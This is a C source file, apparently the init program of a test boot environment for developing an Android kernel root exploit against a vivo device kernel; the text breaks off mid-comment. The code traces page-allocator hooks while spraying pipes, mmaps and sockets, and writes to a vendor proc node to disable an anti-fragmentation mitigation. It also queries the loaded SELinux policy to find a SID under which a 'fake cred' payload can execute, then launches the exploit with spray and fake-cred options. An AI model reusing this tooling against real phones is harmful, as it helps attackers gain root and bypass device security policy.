#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/xattr.h>
#include <grp.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <stdint.h>
#include <time.h>
#include <errno.h>
#include <dirent.h>

static void print_boot_id(const char *tag)
{
	char buf[128];
	ssize_t n;
	int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);

	if (fd < 0) {
		printf("[init] boot_id %s <open failed>\n", tag);
		fflush(stdout);
		return;
	}
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n > 0) {
		buf[n] = '\0';
		printf("[init] boot_id %s %s", tag, buf);
	} else {
		printf("[init] boot_id %s <read failed>\n", tag);
	}
	fflush(stdout);
}

static const char *cmdline(void)
{
	static char buf[1024];
	ssize_t n;
	int fd = open("/proc/cmdline", O_RDONLY);

	if (fd < 0)
		return "";
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n <= 0)
		return "";
	buf[n] = '\0';
	return buf;
}

static int cmdline_has(const char *needle)
{
	return strstr(cmdline(), needle) != NULL;
}

static const char *cmdline_value(const char *key)
{
	static char val[64];
	const char *p = strstr(cmdline(), key);
	size_t i = 0;

	if (!p)
		return NULL;
	p += strlen(key);
	/* /proc/cmdline ends with a newline; it must not become part of the
	 * last token's value. */
	while (*p && *p != ' ' && *p != '\n' && *p != '\r' &&
	       *p != '\t' && i < sizeof(val) - 1)
		val[i++] = *p++;
	val[i] = '\0';
	return i ? val : NULL;
}

static unsigned long long sym_addr(const char *want)
{
	char line[256], name[200], type;
	unsigned long long addr;
	FILE *f = fopen("/proc/kallsyms", "r");

	if (!f)
		return 0;
	while (fgets(line, sizeof(line), f)) {
		if (sscanf(line, "%llx %c %199s", &addr, &type, name) == 3 &&
		    !strcmp(name, want)) {
			fclose(f);
			return addr;
		}
	}
	fclose(f);
	return 0;
}

static void print_syms(void)
{
	unsigned long long text = sym_addr("_text");
	unsigned long long bootid = sym_addr("sysctl_bootid");
	unsigned long long init_task = sym_addr("init_task");

	printf("[init] sym _text=0x%llx sysctl_bootid=0x%llx init_task=0x%llx\n",
	       text, bootid, init_task);
	fflush(stdout);
}

#define TR_DIR "/sys/kernel/tracing"

static void cat_to_stderr(const char *path)
{
	char buf[4096];
	ssize_t n;
	int fd = open(path, O_RDONLY);

	fprintf(stderr, "--- %s ---\n", path);
	if (fd < 0) {
		fprintf(stderr, "open errno=%d\n", errno);
		fflush(stderr);
		return;
	}
	while ((n = read(fd, buf, sizeof(buf))) > 0)
		fwrite(buf, 1, (size_t)n, stderr);
	close(fd);
	fprintf(stderr, "\n");
	fflush(stderr);
}

static void tr_write(const char *path, const char *s)
{
	ssize_t n;
	int fd = open(path, O_WRONLY | O_CLOEXEC);

	if (fd < 0) {
		fprintf(stderr, "[tr] %s open errno=%d\n", path, errno);
		return;
	}
	n = write(fd, s, strlen(s));
	if (n != (ssize_t)strlen(s))
		fprintf(stderr, "[tr] %s write=%zd errno=%d\n", path, n,
			errno);
	close(fd);
}

static void list_dir(const char *path)
{
	struct dirent *de;
	DIR *d = opendir(path);

	fprintf(stderr, "--- ls %s ---\n", path);
	if (!d) {
		fprintf(stderr, "opendir errno=%d\n", errno);
		fflush(stderr);
		return;
	}
	while ((de = readdir(d)))
		fprintf(stderr, "%s\n", de->d_name);
	closedir(d);
	fflush(stderr);
}

static void tr_marker(const char *s)
{
	tr_write(TR_DIR "/trace_marker", s);
}

static void trace_workload(void)
{
	unsigned int i;
	int pfd[2];
	void *p;
	char buf[4096];
	int fds[8][2];
	char msg[7808];

	memset(msg, 0x54, sizeof(msg));
	for (i = 0; i < 8; i++) {
		tr_marker("MARK pte\n");
		p = mmap(NULL, 2 * 1024 * 1024, PROT_READ | PROT_WRITE,
			 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (p == MAP_FAILED) {
			fprintf(stderr, "[tr] pte mmap errno=%d\n", errno);
			break;
		}
		*(volatile char *)p = 1;
		/* keep the mapping; unmap later */
	}
	for (i = 0; i < 8; i++) {
		tr_marker("MARK pipe\n");
		if (pipe(pfd)) {
			fprintf(stderr, "[tr] pipe errno=%d\n", errno);
			break;
		}
		memset(buf, 0x50, sizeof(buf));
		if (write(pfd[1], buf, sizeof(buf)) != (ssize_t)sizeof(buf))
			fprintf(stderr, "[tr] pipe write errno=%d\n", errno);
		/* keep both ends open so the page stays allocated */
	}
	for (i = 0; i < 8; i++) {
		tr_marker("MARK anon\n");
		p = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
			 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (p == MAP_FAILED)
			break;
		*(volatile char *)p = 1;
	}
	for (i = 0; i < 8; i++) {
		tr_marker("MARK skb\n");
		if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC, 0, fds[i]))
			break;
		(void)send(fds[i][0], msg, sizeof(msg), MSG_DONTWAIT);
	}
	tr_marker("MARK done\n");
}

static void tracefs_probe(int run)
{
	static const char *const events[] = {
		"android_vh_rmqueue",
		"android_vh_rmqueue_bulk_bypass",
		"android_vh_rmqueue_smallest_bypass",
		"android_vh_free_one_page_bypass",
		"android_vh_rmqueue_cma_fallback",
	};
	char p[192];
	unsigned int i;

	mkdir(TR_DIR, 0755);
	if (mount("tracefs", TR_DIR, "tracefs", 0, NULL))
		fprintf(stderr, "[tr] mount errno=%d\n", errno);
	list_dir(TR_DIR);
	list_dir(TR_DIR "/events");
	for (i = 0; i < sizeof(events) / sizeof(events[0]); i++) {
		snprintf(p, sizeof(p), TR_DIR "/events/%s/format", events[i]);
		cat_to_stderr(p);
	}
	{
		int fd = open(TR_DIR "/kprobe_events", O_RDWR);

		fprintf(stderr, "[tr] kprobe_events fd=%d errno=%d\n", fd,
			fd < 0 ? errno : 0);
		if (fd >= 0)
			close(fd);
	}
	if (!run)
		return;
	tr_write(TR_DIR "/tracing_on", "0");
	tr_write(TR_DIR "/trace", "");
	for (i = 0; i < sizeof(events) / sizeof(events[0]); i++) {
		snprintf(p, sizeof(p), TR_DIR "/events/%s/enable", events[i]);
		tr_write(p, "1");
	}
	tr_write(TR_DIR "/tracing_on", "1");
	trace_workload();
	tr_write(TR_DIR "/tracing_on", "0");
	cat_to_stderr(TR_DIR "/trace");
}

static void dump_pagetype(void)
{
	char line[512];
	FILE *f = fopen("/proc/pagetypeinfo", "r");
	int n = 0;

	fprintf(stderr, "=== pagetypeinfo ===\n");
	if (f) {
		while (fgets(line, sizeof(line), f) && n++ < 70)
			fputs(line, stderr);
		fclose(f);
	}
	f = fopen("/proc/buddyinfo", "r");
	fprintf(stderr, "=== buddyinfo ===\n");
	if (f) {
		while (fgets(line, sizeof(line), f))
			fputs(line, stderr);
		fclose(f);
	}
	fflush(stderr);
}

static void sleep_ms(unsigned long ms)
{
	struct timespec ts;

	ts.tv_sec = (time_t)(ms / 1000);
	ts.tv_nsec = (long)(ms % 1000) * 1000000L;
	while (nanosleep(&ts, &ts) == -1 && errno == EINTR)
		;
}

/* ------------------------------------------------------------------
 * SELinux experiment: load the firmware's own binary policy into the
 * 15.0 kernel, stay permissive, then ask the security server (via
 * /sys/fs/selinux/access, whose query takes explicit context strings,
 * so no sidtab knowledge is needed) what the kernel domain would be
 * allowed to do on the labels our chain touches.
 * ------------------------------------------------------------------ */

#define SEL_KERNEL	"u:r:kernel:s0"
#define SEL_SHELL	"u:r:shell:s0"
#define SEL_DATA	"u:object_r:shell_data_file:s0"
#define SEL_SYSTEM	"u:object_r:system_file:s0"
#define SEL_UNLABELED	"u:object_r:unlabeled:s0"
#define SEL_TMPFS	"u:object_r:tmpfs:s0"
#define SEL_SECURITY	"u:object_r:security:s0"
#define SEL_SEC_ROLE	"u:r:security:s0"
#define SEL_SU		"u:r:su:s0"
#define SEL_KSU		"u:r:ksu:s0"
#define SEL_MAGISK	"u:r:magisk:s0"
#define SEL_INIT	"u:r:init:s0"
#define SEL_VENDOR_INIT	"u:r:vendor_init:s0"
#define SEL_UAPP	"u:r:untrusted_app:s0"
#define SEL_PRIVAPP	"u:r:priv_app:s0"
#define SEL_SYSAPP	"u:r:system_app:s0"
#define SEL_SYSSRV	"u:r:system_server:s0"
#define SEL_ADBD	"u:r:adbd:s0"
#define SEL_ZYGOTE	"u:r:zygote:s0"
#define SEL_INSTALLD	"u:r:installd:s0"

static long read_dec_file(const char *path)
{
	char b[64];
	int fd, n;

	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	n = (int)read(fd, b, sizeof(b) - 1);
	close(fd);
	if (n <= 0)
		return -1;
	b[n] = '\0';
	return strtol(b, NULL, 10);
}

static void read_str_file(const char *path, char *out, size_t len)
{
	int fd, n;

	if (!len)
		return;
	out[0] = '\0';
	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return;
	n = (int)read(fd, out, len - 1);
	close(fd);
	if (n <= 0) {
		out[0] = '\0';
		return;
	}
	out[n] = '\0';
}

static int write_str_file(const char *path, const char *s)
{
	int fd, n, e;
	size_t len = strlen(s);

	fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return -errno;
	n = (int)write(fd, s, len);
	e = errno;
	close(fd);
	return n == (int)len ? 0 : -e;
}

static int sel_access(const char *scon, const char *tcon, unsigned int tclass,
		      uint32_t *allowed, uint32_t *flags_out)
{
	char q[192], resp[192];
	unsigned int av = 0, flags = 0;
	int fd, n, qn, e;

	qn = snprintf(q, sizeof(q), "%s %s %u", scon, tcon, tclass);
	if (qn <= 0 || (size_t)qn >= sizeof(q))
		return -EINVAL;
	fd = open("/sys/fs/selinux/access", O_RDWR | O_CLOEXEC);
	if (fd < 0)
		return -errno;
	n = (int)write(fd, q, qn);
	if (n != qn) {
		e = errno;
		close(fd);
		return n < 0 ? -e : -EIO;
	}
	n = (int)read(fd, resp, sizeof(resp) - 1);
	e = errno;
	close(fd);
	if (n <= 0)
		return -e;
	resp[n] = '\0';
	/* allowed policycap auditallow auditdeny seqno flags */
	if (sscanf(resp, "%x %*x %*x %*x %*u %x", &av, &flags) != 2)
		return -EINVAL;
	*allowed = av;
	*flags_out = flags;
	return 0;
}

static void sel_check(const char *scon, const char *tcon, const char *cls,
		      const char *perm)
{
	char p[160];
	long ci, pi;
	uint32_t av = 0, flags = 0;
	int rc;

	snprintf(p, sizeof(p), "/sys/fs/selinux/class/%s/index", cls);
	ci = read_dec_file(p);
	snprintf(p, sizeof(p), "/sys/fs/selinux/class/%s/perms/%s", cls, perm);
	pi = read_dec_file(p);
	if (ci <= 0 || pi <= 0) {
		printf("[sel] %s %s %s %s: class/perm unavailable (%ld,%ld)\n",
		       scon, tcon, cls, perm, ci, pi);
		return;
	}
	rc = sel_access(scon, tcon, (unsigned int)ci, &av, &flags);
	if (rc) {
		printf("[sel] %s %s %s %s: query rc=%d\n",
		       scon, tcon, cls, perm, rc);
		return;
	}
	printf("[sel] %s -> %s %s %s : %s (av=0x%x flags=0x%x)%s\n",
	       scon, tcon, cls, perm,
	       (av >> (pi - 1)) & 1 ? "ALLOW" : "DENY", av, flags,
	       flags ? " [SOURCE-PERMISSIVE]" : "");
}

/* Initial SIDs are the only SIDs with a boot-stable number, so if any of
 * their contexts may execute our payload the fake cred can use that number
 * without knowing the runtime-assigned shell SID. */
static void sel_initial_exec_probe(void)
{
	DIR *d;
	struct dirent *de;
	char path[192], ctx[160];
	size_t n;

	d = opendir("/sys/fs/selinux/initial_contexts");
	if (!d) {
		printf("[sel] initial_contexts opendir errno=%d\n", errno);
		return;
	}
	printf("[sel] --- initial sid contexts vs shell_data_file ---\n");
	while ((de = readdir(d))) {
		if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, ".."))
			continue;
		snprintf(path, sizeof(path),
			 "/sys/fs/selinux/initial_contexts/%s", de->d_name);
		read_str_file(path, ctx, sizeof(ctx));
		n = strlen(ctx);
		while (n && (ctx[n - 1] == '\n' || ctx[n - 1] == '\r' ||
			     ctx[n - 1] == ' '))
			ctx[--n] = '\0';
		if (!n)
			continue;
		printf("[sel] isid %s = %s\n", de->d_name, ctx);
		sel_check(ctx, SEL_DATA, "file", "execute_no_trans");
	}
	closedir(d);
}

static const char *const sel_queries[][4] = {
	{ SEL_KERNEL, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_KERNEL, SEL_DATA, "file", "execute" },
	{ SEL_KERNEL, SEL_DATA, "file", "read" },
	{ SEL_KERNEL, SEL_DATA, "file", "open" },
	{ SEL_KERNEL, SEL_DATA, "file", "getattr" },
	{ SEL_KERNEL, SEL_DATA, "file", "write" },
	{ SEL_KERNEL, SEL_DATA, "file", "map" },
	{ SEL_KERNEL, SEL_DATA, "dir", "search" },
	{ SEL_KERNEL, SEL_DATA, "dir", "write" },
	{ SEL_KERNEL, SEL_DATA, "dir", "add_name" },
	{ SEL_KERNEL, SEL_DATA, "dir", "remove_name" },
	{ SEL_KERNEL, SEL_SYSTEM, "file", "execute_no_trans" },
	{ SEL_KERNEL, SEL_SYSTEM, "file", "execute" },
	{ SEL_KERNEL, SEL_SYSTEM, "file", "entrypoint" },
	{ SEL_KERNEL, SEL_SYSTEM, "file", "read" },
	{ SEL_KERNEL, SEL_SYSTEM, "file", "open" },
	{ SEL_KERNEL, SEL_SYSTEM, "file", "getattr" },
	{ SEL_KERNEL, SEL_UNLABELED, "file", "execute_no_trans" },
	{ SEL_KERNEL, SEL_TMPFS, "file", "execute_no_trans" },
	{ SEL_KERNEL, SEL_KERNEL, "process", "fork" },
	{ SEL_KERNEL, SEL_KERNEL, "process", "transition" },
	{ SEL_KERNEL, SEL_KERNEL, "process", "setcurrent" },
	{ SEL_KERNEL, SEL_SHELL, "process", "transition" },
	{ SEL_KERNEL, SEL_KERNEL, "capability", "setuid" },
	{ SEL_KERNEL, SEL_KERNEL, "capability", "setgid" },
	{ SEL_KERNEL, SEL_KERNEL, "capability", "dac_override" },
	{ SEL_KERNEL, SEL_KERNEL, "capability", "dac_read_search" },
	{ SEL_KERNEL, SEL_KERNEL, "capability", "sys_admin" },
	{ SEL_KERNEL, SEL_KERNEL, "capability", "sys_ptrace" },
	{ SEL_KERNEL, SEL_KERNEL, "capability", "sys_chroot" },
	{ SEL_KERNEL, SEL_KERNEL, "capability", "mknod" },
	{ SEL_KERNEL, SEL_KERNEL, "capability", "setpcap" },
	{ SEL_KERNEL, SEL_KERNEL, "io_uring", "override_creds" },
	{ SEL_KERNEL, SEL_KERNEL, "io_uring", "sqpoll" },
	{ SEL_KERNEL, SEL_SECURITY, "security", "compute_av" },
	{ SEL_KERNEL, SEL_SECURITY, "security", "setenforce" },
	{ SEL_KERNEL, SEL_SECURITY, "security", "load_policy" },
	{ SEL_KERNEL, SEL_SEC_ROLE, "security", "setenforce" },
	{ SEL_KERNEL, SEL_SEC_ROLE, "security", "load_policy" },
	{ SEL_SHELL, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_SHELL, SEL_DATA, "file", "read" },
	{ SEL_SHELL, SEL_DATA, "file", "write" },
	{ SEL_SHELL, SEL_DATA, "dir", "search" },
	{ SEL_SHELL, SEL_DATA, "dir", "add_name" },
	{ SEL_SHELL, SEL_DATA, "dir", "remove_name" },
	{ SEL_SHELL, SEL_SYSTEM, "file", "execute_no_trans" },
	{ SEL_SHELL, SEL_KERNEL, "anon_inode", "create" },
	/* An anon_create with no typetransition falls back to the *target*
	 * type, so an io_uring file made by shell is checked shell->shell. */
	{ SEL_SHELL, SEL_SHELL, "anon_inode", "create" },
	{ SEL_SHELL, SEL_SHELL, "anon_inode", "map" },
	{ SEL_UAPP, SEL_UAPP, "anon_inode", "create" },
	{ SEL_KERNEL, SEL_KERNEL, "anon_inode", "create" },
	{ SEL_SHELL, SEL_SHELL, "io_uring", "cmd" },
	{ SEL_SHELL, SEL_SHELL, "io_uring", "override_creds" },
	{ SEL_SHELL, SEL_SHELL, "io_uring", "sqpoll" },
	{ SEL_SHELL, SEL_SHELL, "packet_socket", "create" },
	{ SEL_SHELL, SEL_SHELL, "packet_socket", "map" },
	{ SEL_SHELL, SEL_SHELL, "capability", "net_raw" },
	{ SEL_SHELL, SEL_SHELL, "capability", "net_admin" },
	{ SEL_SHELL, SEL_SHELL, "perf_event", "open" },
	{ SEL_UAPP, SEL_UAPP, "perf_event", "open" },
	{ SEL_SHELL, SEL_SHELL, "user_namespace", "create" },
	{ SEL_UAPP, SEL_UAPP, "user_namespace", "create" },
	{ SEL_KERNEL, SEL_KERNEL, "user_namespace", "create" },
	{ SEL_SHELL, SEL_KERNEL, "capability", "setuid" },
	{ SEL_SHELL, SEL_KERNEL, "capability", "setgid" },
	{ SEL_SHELL, SEL_KERNEL, "capability", "dac_override" },
	{ SEL_SHELL, SEL_KERNEL, "capability", "dac_read_search" },
	{ SEL_SHELL, SEL_KERNEL, "capability", "sys_admin" },
	{ SEL_SHELL, SEL_KERNEL, "capability", "sys_ptrace" },
	{ SEL_SHELL, SEL_KERNEL, "capability", "setpcap" },
	{ SEL_SHELL, SEL_SEC_ROLE, "security", "setenforce" },
	{ SEL_SHELL, SEL_SEC_ROLE, "security", "load_policy" },
	/* Which other domains could execute a payload on shell_data_file,
	 * and is any of them permissive?  (flags != 0 => permissive type) */
	{ SEL_INIT, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_SU, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_KSU, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_MAGISK, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_VENDOR_INIT, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_UAPP, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_PRIVAPP, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_SYSAPP, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_SYSSRV, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_ADBD, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_ZYGOTE, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_INSTALLD, SEL_DATA, "file", "execute_no_trans" },
	{ SEL_SU, SEL_SU, "process", "fork" },
	{ SEL_KSU, SEL_KSU, "process", "fork" },
	{ SEL_SHELL, SEL_SHELL, "process", "fork" },
	/* Second round: rules that decide whether the exploit can stage as
	 * u:r:shell:s0 (the device's adb shell) with the policy enforced, and
	 * what a permissive domain buys.  Capability checks use the subject's
	 * own SID as both source and target. */
	{ SEL_SHELL, SEL_SHELL, "io_uring", "override_creds" },
	{ SEL_SHELL, SEL_SHELL, "io_uring", "sqpoll" },
	{ SEL_SHELL, SEL_SHELL, "anon_inode", "create" },
	{ SEL_SHELL, SEL_SHELL, "process", "getattr" },
	{ SEL_SHELL, SEL_SHELL, "process", "setcurrent" },
	{ SEL_SHELL, SEL_SHELL, "process", "setexec" },
	{ SEL_SHELL, SEL_SHELL, "capability", "setuid" },
	{ SEL_SHELL, SEL_SHELL, "capability", "setgid" },
	{ SEL_SHELL, SEL_SHELL, "capability", "dac_override" },
	{ SEL_SHELL, SEL_SHELL, "capability", "dac_read_search" },
	{ SEL_SHELL, SEL_SHELL, "capability", "sys_admin" },
	{ SEL_SHELL, SEL_SHELL, "capability", "sys_ptrace" },
	{ SEL_SHELL, SEL_SHELL, "capability", "sys_chroot" },
	{ SEL_SHELL, SEL_SHELL, "capability", "mknod" },
	{ SEL_SHELL, SEL_SHELL, "capability", "setpcap" },
	{ SEL_SHELL, SEL_SHELL, "capability", "sys_boot" },
	{ SEL_KSU, SEL_KSU, "capability", "setuid" },
	{ SEL_KSU, SEL_KSU, "capability", "setgid" },
	{ SEL_KSU, SEL_KSU, "capability", "dac_override" },
	{ SEL_KSU, SEL_KSU, "capability", "sys_admin" },
	{ SEL_SU, SEL_SU, "capability", "setuid" },
	{ SEL_SU, SEL_SU, "capability", "sys_admin" },
	{ SEL_KERNEL, SEL_KERNEL, "process", "getattr" },
	{ SEL_KSU, SEL_KSU, "process", "getattr" },
	/* The initramfs files carry no xattr; after the policy load their
	 * inode SID is the initial-SID "unlabeled".  This is the exec check
	 * that decides whether init can still start /exploit under enforcing. */
	{ SEL_KERNEL, SEL_UNLABELED, "file", "read" },
	{ SEL_KERNEL, SEL_UNLABELED, "file", "open" },
	{ SEL_KERNEL, SEL_UNLABELED, "file", "getattr" },
	{ SEL_KERNEL, SEL_UNLABELED, "file", "execute" },
	{ SEL_SHELL, SEL_UNLABELED, "file", "execute_no_trans" },
	{ SEL_SHELL, SEL_UNLABELED, "file", "read" },
	{ SEL_SHELL, SEL_UNLABELED, "file", "open" },
	{ SEL_SHELL, SEL_TMPFS, "file", "execute_no_trans" },
	/* Is shell's zero capability mask an artifact or a real vivo choice?
	 * Compare other domains, and find who (if anyone) may create anon
	 * inodes (io_uring, eventfd, timerfd all go through this check). */
	{ SEL_INIT, SEL_INIT, "capability", "setuid" },
	{ SEL_INIT, SEL_INIT, "capability", "dac_override" },
	{ SEL_INIT, SEL_INIT, "capability", "sys_admin" },
	{ SEL_SYSSRV, SEL_SYSSRV, "capability", "setuid" },
	{ SEL_SYSSRV, SEL_SYSSRV, "capability", "dac_override" },
	{ SEL_ZYGOTE, SEL_ZYGOTE, "capability", "setuid" },
	{ SEL_ADBD, SEL_ADBD, "capability", "setuid" },
	{ SEL_ADBD, SEL_ADBD, "capability", "dac_override" },
	{ SEL_ADBD, SEL_ADBD, "capability", "net_raw" },
	{ SEL_UAPP, SEL_UAPP, "capability", "setuid" },
	{ SEL_UAPP, SEL_UAPP, "capability", "dac_override" },
	{ SEL_INIT, "u:object_r:init:s0", "anon_inode", "create" },
	{ SEL_SYSSRV, "u:object_r:system_server:s0", "anon_inode", "create" },
	{ SEL_ZYGOTE, "u:object_r:zygote:s0", "anon_inode", "create" },
	{ SEL_ADBD, "u:object_r:adbd:s0", "anon_inode", "create" },
	{ SEL_UAPP, "u:object_r:untrusted_app:s0", "anon_inode", "create" },
	{ SEL_KSU, "u:object_r:ksu:s0", "anon_inode", "create" },
	{ SEL_SHELL, "u:object_r:shell:s0", "anon_inode", "create" },
};

static int copy_file(const char *src, const char *dst, mode_t mode, uid_t uid)
{
	char b[65536];
	int in, out;
	ssize_t n;

	in = open(src, O_RDONLY | O_CLOEXEC);
	if (in < 0)
		return -1;
	out = open(dst, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
	if (out < 0) {
		close(in);
		return -1;
	}
	while ((n = read(in, b, sizeof(b))) > 0) {
		ssize_t off = 0;

		while (off < n) {
			ssize_t w = write(out, b + off, (size_t)(n - off));

			if (w <= 0)
				break;
			off += w;
		}
		if (off < n)
			break;
	}
	close(in);
	if (fchown(out, uid, uid))
		;
	fchmod(out, mode);
	close(out);
	return 0;
}

static void selinux_init(void)
{
	char cur[128];
	char *buf;
	off_t sz, off;
	int fd, lfd, i, e;
	ssize_t w;

	mkdir("/sys/fs/selinux", 0755);
	if (mount("selinuxfs", "/sys/fs/selinux", "selinuxfs", 0, NULL))
		printf("[sel] selinuxfs mount failed errno=%d\n", errno);
	else
		printf("[sel] selinuxfs mounted\n");

	fd = open("/policy.bin", O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		printf("[sel] /policy.bin missing errno=%d\n", errno);
		return;
	}
	sz = lseek(fd, 0, SEEK_END);
	if (sz <= 0 || sz > (off_t)(16 << 20) || lseek(fd, 0, SEEK_SET) < 0) {
		close(fd);
		printf("[sel] bad policy size\n");
		return;
	}
	buf = malloc((size_t)sz);
	if (!buf) {
		close(fd);
		printf("[sel] policy malloc failed\n");
		return;
	}
	for (off = 0; off < sz; ) {
		ssize_t r = read(fd, buf + off, (size_t)(sz - off));

		if (r <= 0)
			break;
		off += r;
	}
	close(fd);
	if (off != sz) {
		free(buf);
		printf("[sel] policy read %ld/%ld\n", (long)off, (long)sz);
		return;
	}

	/* sel_write_load treats one write() as one whole policy. */
	lfd = open("/sys/fs/selinux/load", O_WRONLY | O_CLOEXEC);
	if (lfd < 0) {
		printf("[sel] load open errno=%d\n", errno);
		free(buf);
		return;
	}
	w = write(lfd, buf, (size_t)sz);
	e = errno;
	close(lfd);
	free(buf);
	printf("[sel] policy write %ld/%ld errno=%d\n", (long)w, (long)sz, e);

	/* Stay permissive unless ic_enforce=1: verdicts come from access()
	 * and the AVC audit. */
	e = write_str_file("/sys/fs/selinux/enforce",
			   cmdline_has("ic_enforce=1") ? "1" : "0");
	read_str_file("/sys/fs/selinux/enforce", cur, sizeof(cur));
	printf("[sel] enforce write rc=%d value=%s\n", e, cur);
	read_str_file("/sys/fs/selinux/policyvers", cur, sizeof(cur));
	printf("[sel] policyvers=%s\n", cur);
	read_str_file("/proc/self/attr/current", cur, sizeof(cur));
	printf("[sel] current=%s", cur);

	{
		char sb[9000];
		int sfd, sn;

		memset(sb, 0, sizeof(sb));
		sfd = open("/sys/fs/selinux/ss/sidtab_hash_stats",
			   O_RDONLY | O_CLOEXEC);
		sn = -1;
		if (sfd >= 0) {
			sn = (int)read(sfd, sb, sizeof(sb) - 1);
			close(sfd);
		} else {
			sn = -errno;
		}
		if (sn > 0)
			sb[sn] = '\0';
		printf("[sel] sidstats n=%d errno=%d\n", sn,
		       sn < 0 ? -sn : errno);
		printf("[sel] SIDSTATS_BEGIN\n%s\n[sel] SIDSTATS_END\n", sb);
		fflush(stdout);
	}

	e = setxattr("/tmp/ic-exec-helper", "security.selinux", SEL_DATA,
		     strlen(SEL_DATA) + 1, 0);
	printf("[sel] label helper shell_data_file rc=%d errno=%d\n", e,
	       e ? errno : 0);
	e = setxattr("/tmp/sel-exec", "security.selinux", SEL_DATA,
		     strlen(SEL_DATA) + 1, 0);
	printf("[sel] label sel-exec shell_data_file rc=%d errno=%d\n", e,
	       e ? errno : 0);
	e = setxattr("/tmp/sel-system", "security.selinux", SEL_SYSTEM,
		     strlen(SEL_SYSTEM) + 1, 0);
	printf("[sel] label sel-system system_file rc=%d errno=%d\n", e,
	       e ? errno : 0);

	for (i = 0; i < (int)(sizeof(sel_queries) / sizeof(sel_queries[0])); i++)
		sel_check(sel_queries[i][0], sel_queries[i][1],
			  sel_queries[i][2], sel_queries[i][3]);
	sel_initial_exec_probe();
	fflush(stdout);
}

/* Exec from the init process, which after policy load is the kernel
 * domain: this is the same (context -> file label) check our winning
 * child will make on the device.  Permissive mode lets it complete and
 * leaves an avc line if policy denies it; the program prints the
 * context it ended up in. */
static void selinux_exec_test(const char *path)
{
	pid_t p;
	int st;

	p = fork();
	if (p == 0) {
		char *const argv[] = { (char *)"sel-exec", NULL };
		char *const envp[] = { (char *)"PATH=/system/bin", NULL };

		execve(path, argv, envp);
		printf("[sel] execve %s failed errno=%d\n", path, errno);
		fflush(stdout);
		_exit(111);
	}
	if (p > 0 && waitpid(p, &st, 0) == p)
		printf("[sel] exec %s status=0x%x\n", path, st);
	fflush(stdout);
}

static void list_dir_entries(const char *path)
{
	DIR *d = opendir(path);
	struct dirent *e;

	if (!d) {
		printf("[af] opendir %s errno=%d\n", path, errno);
		return;
	}
	printf("[af] ls %s:", path);
	while ((e = readdir(d)) != NULL) {
		if (strstr(e->d_name, "antifrag") ||
		    strstr(e->d_name, "rsc"))
			printf(" %s", e->d_name);
	}
	printf("\n");
	closedir(d);
}

/* rsc_mem_mon's mem_antifrag node: writing 0 once sets the built-in
 * rsc_mem_antifrag_disabled flag the core allocator reads, and
 * reconfigures the RSC isolate pages for migratetypes 5/6.  Run as
 * root before the exploit drops to uid 1000. */
static void antifrag_probe(void)
{
	const char *path = "/proc/vivo_rsc/mem_antifrag";
	char buf[128];
	ssize_t n;
	int fd;

	fd = open(path, O_RDONLY);
	if (fd < 0) {
		printf("[af] open %s errno=%d\n", path, errno);
		list_dir_entries("/proc/vivo_rsc");
		list_dir_entries("/proc");
		fflush(stdout);
		return;
	}
	n = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (n > 0) {
		buf[n] = '\0';
		printf("[af] before: %s", buf);
	}
	fd = open(path, O_WRONLY);
	printf("[af] write-open fd=%d errno=%d\n", fd, errno);
	if (fd >= 0) {
		n = write(fd, "0\n", 2);
		printf("[af] write ret=%zd errno=%d\n", (long)n, errno);
		close(fd);
	}
	fd = open(path, O_RDONLY);
	if (fd >= 0) {
		n = read(fd, buf, sizeof(buf) - 1);
		close(fd);
		if (n > 0) {
			buf[n] = '\0';
			printf("[af] after: %s", buf);
		}
	}
	fflush(stdout);
}

static void run_exploit(const char *target)
{
	pid_t p = fork();
	int st;
	int keep_root = cmdline_has("ic_root=1");
	int peak = cmdline_has("ic_peak=1");

	if (p == 0) {
		if (peak) {
			/* The peak path needs no kallsyms: every fake object it
			 * points at lives inside the leaked order-1 block. */
			setenv("IC_PEAK", "1", 1);
			{
				/* Fake cred sid override: a policy-enforcing
				 * endgame has to run under a sid whose domain may
				 * execute the payload's label. */
				const char *sid = cmdline_value("ic_peak_sid=");

				if (sid && *sid)
					setenv("IC_PEAK_SID", sid, 1);
			}
			if (!cmdline_value("ic_spray="))
				setenv("IC_SPRAY", "ioring", 1);
			if (cmdline_has("ic_fork=1"))
				setenv("IC_FORK", "1", 1);
			if (cmdline_has("ic_scan=1")) {
				const char *v = cmdline_value("ic_scan_exec=");
				const char *m;
				const char *p;

				setenv("IC_SCAN", "1", 1);
				setenv("IC_SCAN_EXEC",
				       v && *v ? v : "/tmp/ic-exec-helper", 1);
				m = cmdline_value("ic_scan_max=");
				if (m && *m)
					setenv("IC_SCAN_MAX", m, 1);
				/* Late policy load: the exploit labels the
				 * payload, loads this policy and turns on
				 * enforcement itself, so the boot stays
